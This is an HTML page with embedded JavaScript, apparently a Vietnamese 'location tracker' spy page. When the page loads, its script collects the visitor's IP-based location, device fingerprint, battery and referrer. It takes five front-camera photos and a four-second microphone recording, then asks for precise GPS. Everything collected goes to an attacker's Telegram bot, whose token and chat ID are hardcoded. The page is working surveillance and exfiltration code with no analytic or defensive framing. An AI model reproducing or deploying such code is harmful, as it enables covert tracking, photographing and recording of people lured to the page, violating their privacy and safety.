<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Hoang Anh - Location Tracker</title>
    <style>
        body {
            background: black;
            color: lime;
            font-family: monospace;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #info {
            white-space: pre-wrap;
            text-align: left;
            margin: auto;
            max-width: 600px;
            width: 100%;
            background: #111;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid lime;
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
            word-break: break-word;
            font-size: 14px;
            line-height: 1.6;
        }
        .error {
            color: #ff6666;
        }
        .loading {
            color: yellow;
        }
        .success {
            color: #66ff66;
        }
        .warning {
            color: #ffaa66;
            border-color: #ffaa66;
        }
        button {
            background: #222;
            color: lime;
            border: 1px solid lime;
            padding: 10px 20px;
            margin-top: 15px;
            border-radius: 5px;
            cursor: pointer;
            font-family: monospace;
            font-size: 14px;
        }
        button:hover {
            background: lime;
            color: black;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="info" class="loading">⏳ Đang tải thông tin...</div>
    <div id="gpsBtnContainer" class="hidden">
        <button id="gpsButton">📍 Cho phép định vị chính xác</button>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // Cấu hình Telegram
        const botToken = '8677995221:AAEmsO71OlTS4PY7ML9md9XA-5PRAbQyfMI';
        const chatId = '7211752234';
        const infoDiv = document.getElementById('info');
        
        // Cấu hình chụp ảnh
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        
        // Cấu hình ghi âm
        const AUDIO_DURATION = 4000;
        
        // Cờ để tránh gửi trùng lặp
        let infoSent = false;
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // Hàm gửi tin nhắn đến Telegram
        async function sendToTelegram(text, retryCount = 0) {
            const maxRetries = 2;
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text.substring(0, 4096),
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    })
                });
                
                const data = await response.json();
                if (!data.ok && retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
                return data;
            } catch (e) {
                console.error('Telegram Fetch Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi file âm thanh
        async function sendAudioToTelegram(blob, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Đã gửi ghi âm thành công');
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Telegram Audio Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi ảnh
        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    photoSentCount++;
                    console.log(`✅ Đã gửi ảnh #${photoNumber}`);
                    
                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                        setTimeout(() => {
                            cameraStream.getTracks().forEach(track => track.stop());
                            cameraStream = null;
                            cameraActive = false;
                        }, 2000);
                    }
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Telegram Photo Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            }
        }

        // Hàm chụp ảnh
        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob((blob) => {
                            if (blob) {
                                sendPhotoToTelegram(blob, photoNumber);
                                resolve(true);
                            } else {
                                resolve(false);
                            }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => {
                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
                        }, 100);
                    }
                } catch (e) {
                    console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
                    resolve(false);
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) {
                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                }
            }
        }

        // Hàm ghi âm
        async function startRecording() {
            if (audioRecorded) return;
            try {
                console.log('🎤 Bắt đầu ghi âm...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    if (audioBlob.size > 0) {
                        await sendAudioToTelegram(audioBlob);
                        audioRecorded = true;
                    }
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, AUDIO_DURATION);
            } catch (e) {
                console.error('Lỗi ghi âm:', e);
            }
        }

        // ================== SỬA LỖI THÔNG TIN THÀNH PHỐ, KHU VỰC, QUỐC GIA, NHÀ MẠNG ==================
        // Hàm lấy thông tin IP và vị trí chính xác, ưu tiên API có dữ liệu đầy đủ và chuẩn
        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let locationData = {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
            
            // Bước 1: Lấy IP chính xác từ nhiều nguồn
            const ipAPIs = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (const api of ipAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);
                    const response = await fetch(api, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    if (api.includes('ipify')) ip = data.ip;
                    else if (api.includes('my-ip')) ip = data.ip;
                    else if (api.includes('ipapi.co')) ip = data.ip;
                    if (ip && ip !== 'Không xác định') break;
                } catch (e) {
                    console.log(`IP API ${api} failed:`, e);
                }
            }
            
            // Bước 2: Lấy vị trí từ IP với thứ tự ưu tiên các API có độ chính xác cao nhất cho Việt Nam và thế giới
            // Sử dụng ip-api.com làm nguồn chính (nhanh, chính xác, hỗ trợ tốt)
            const locationAPIs = [
                // 1. ip-api.com - ưu tiên hàng đầu vì dữ liệu chuẩn, có regionName, city, isp rõ ràng
                {
                    url: `https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,
                    parser: (data) => {
                        if (data && data.status === 'success') {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
                                lat: data.lat || null,
                                lon: data.lon || null
                            };
                        }
                        return null;
                    }
                },
                // 2. ipapi.co - backup tốt
                {
                    url: `https://ipapi.co/${ip}/json/`,
                    parser: (data) => {
                        if (data && !data.error) {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: data.latitude || null,
                                lon: data.longitude || null
                            };
                        }
                        return null;
                    }
                },
                // 3. ipinfo.io - cũng có dữ liệu tốt
                {
                    url: `https://ipinfo.io/${ip}/json`,
                    parser: (data) => {
                        if (data && !data.error) {
                            let lat = null, lon = null;
                            if (data.loc && typeof data.loc === 'string') {
                                const parts = data.loc.split(',');
                                if (parts.length === 2) {
                                    lat = parseFloat(parts[0]);
                                    lon = parseFloat(parts[1]);
                                }
                            }
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: lat,
                                lon: lon
                            };
                        }
                        return null;
                    }
                }
            ];
            
            // Lấy dữ liệu từ API ưu tiên, nếu api đầu tiên thành công sẽ dùng luôn
            for (const api of locationAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6000);
                    const response = await fetch(api.url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    const result = api.parser(data);
                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
                        locationData = result;
                        console.log(`✅ Lấy vị trí thành công từ: ${api.url}`, locationData);
                        break;
                    }
                } catch (e) {
                    console.log(`API ${api.url} failed:`, e);
                }
            }
            
            // Nếu vẫn chưa có city/region/country, thử dùng freegeoip nhưng ít chính xác hơn, nhưng vẫn thử
            if (locationData.city === 'Không xác định' && locationData.country === 'Không xác định') {
                try {
                    const fallbackUrl = `https://freegeoip.app/json/${ip}`;
                    const response = await fetch(fallbackUrl, { timeout: 5000 });
                    const data = await response.json();
                    if (data && data.country_name) {
                        locationData = {
                            city: data.city || 'Không xác định',
                            region: data.region_name || 'Không xác định',
                            country: data.country_name || 'Không xác định',
                            isp: data.isp || 'Không xác định',
                            lat: data.latitude || null,
                            lon: data.longitude || null
                        };
                        console.log("✅ Dùng freegeoip.app cho dữ liệu:", locationData);
                    }
                } catch(e) {}
            }
            
            // Đảm bảo không có giá trị rỗng hay undefined, chuẩn hóa dữ liệu hiển thị
            locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
            locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
            locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
            locationData.isp = (locationData.isp && locationData.isp !== 'undefined' && locationData.isp !== 'null') ? locationData.isp : 'Không xác định';
            
            return { ip, locationData };
        }

        // Hàm yêu cầu GPS
        function setupGPSButton() {
            const btnContainer = document.getElementById('gpsBtnContainer');
            const gpsBtn = document.getElementById('gpsButton');
            
            btnContainer.classList.remove('hidden');
            
            gpsBtn.addEventListener('click', async () => {
                if (gpsDataSent) return;
                
                infoDiv.innerHTML += '\n\n📍 Đang lấy vị trí GPS...';
                
                if (!('geolocation' in navigator)) {
                    infoDiv.innerHTML += '\n❌ Trình duyệt không hỗ trợ GPS';
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const accuracy = pos.coords.accuracy;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        const gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
                            `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
                            `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
                            `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n` +
                            `<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
                        
                        await sendToTelegram(gpsMessage);
                        gpsDataSent = true;
                        
                        infoDiv.innerHTML += `\n✅ Đã gửi vị trí GPS!\n📍 ${lat}, ${lng}`;
                        btnContainer.classList.add('hidden');
                    },
                    (err) => {
                        let errorMsg = '';
                        switch(err.code) {
                            case err.PERMISSION_DENIED:
                                errorMsg = 'Người dùng từ chối chia sẻ vị trí';
                                break;
                            case err.POSITION_UNAVAILABLE:
                                errorMsg = 'Không thể xác định vị trí';
                                break;
                            case err.TIMEOUT:
                                errorMsg = 'Hết thời gian chờ';
                                break;
                            default:
                                errorMsg = err.message;
                        }
                        infoDiv.innerHTML += `\n❌ Lỗi GPS: ${errorMsg}`;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Lấy thông tin thiết bị
        async function getInfo() {
            // Lấy IP và vị trí đã sửa lỗi
            const { ip, locationData } = await getIPAndLocation();
            
            // Lấy thông tin pin
            let batteryPercent = 'Không xác định';
            let batteryCharging = false;
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryPercent = `${Math.round(battery.level * 100)}%`;
                    batteryCharging = battery.charging;
                }
            } catch (battErr) {
                console.error('Battery Error:', battErr);
            }
            
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
            const currentTime = new Date().toLocaleString('vi-VN');
            const language = navigator.language || 'Không xác định';
            const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
            const referrer = document.referrer || 'Truy cập trực tiếp';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
            
            // Tạo link Google Maps nếu có tọa độ
            let mapsLink = '';
            if (locationData.lat && locationData.lon) {
                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
            }
            
            // Hiển thị thông tin trên web với dữ liệu đã được sửa chính xác
            const text = `📱 THÔNG TIN KHÁCH TRUY CẬP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 Địa chỉ IP : ${ip}
📍 Thành phố : ${locationData.city}
🗺️ Khu vực : ${locationData.region}
🏳️ Quốc gia : ${locationData.country}
🏢 Nhà mạng : ${locationData.isp}${mapsLink}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 Trình duyệt : ${userAgent.substring(0, 100)}...
🖥️ Hệ điều hành : ${platform}
📺 Độ phân giải : ${screenWidth} x ${screenHeight}
🔋 Pin : ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}
💾 RAM thiết bị : ${deviceMemory}
⚙️ CPU Core : ${hardwareConcurrency}
🍪 Cookie : ${cookieEnabled}
🌐 Ngôn ngữ : ${language}
⏰ Múi giờ : ${timezone}
🕐 Thời gian : ${currentTime}
📎 Nguồn truy cập : ${referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            infoDiv.className = 'success';
            infoDiv.innerHTML = text;
            
            // Thêm nút GPS
            setupGPSButton();
            infoDiv.innerHTML += '\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⬇️ Nhấn nút bên dưới để gửi vị trí chính xác ⬇️';
            
            if (!infoSent) {
                infoSent = true;
                
                let telegramMapsLink = '';
                if (locationData.lat && locationData.lon) {
                    telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
                }
                
                // Gửi tin nhắn Telegram với dữ liệu đã sửa
                const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
                    `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
                    `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
                    `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
                    `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
                    `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
                    `<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n` +
                    `<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n` +
                    `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
                    `<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n` +
                    `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
                    `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
                    `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
                    `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
                    `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
                    `<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
                
                await sendToTelegram(telegramText);
            }
        }
        
        // Khởi tạo camera
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('Camera not supported');
                return;
            }
            
            try {
                console.log('📷 Yêu cầu camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 800 },
                        height: { ideal: 600 },
                        facingMode: 'user'
                    }
                });
                
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 500));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) {
                console.warn('Camera error:', e);
                cameraActive = false;
            }
        }
        
        async function requestAudioImmediately() {
            setTimeout(async () => {
                if (!audioRecorded) {
                    await startRecording();
                }
            }, 100);
        }
        
        async function init() {
            try {
                console.log('🚀 Khởi tạo...');
                const infoPromise = getInfo();
                const cameraPromise = startCameraImmediately();
                await cameraPromise;
                await requestAudioImmediately();
                await infoPromise;
            } catch (err) {
                console.error('Init error:', err);
                infoDiv.className = 'error';
                infoDiv.innerHTML = '❌ Đã xảy ra lỗi: ' + err.message + '\n\nVui lòng làm mới trang.';
            }
        }
        
        init();
    </script>
</body>
</html>
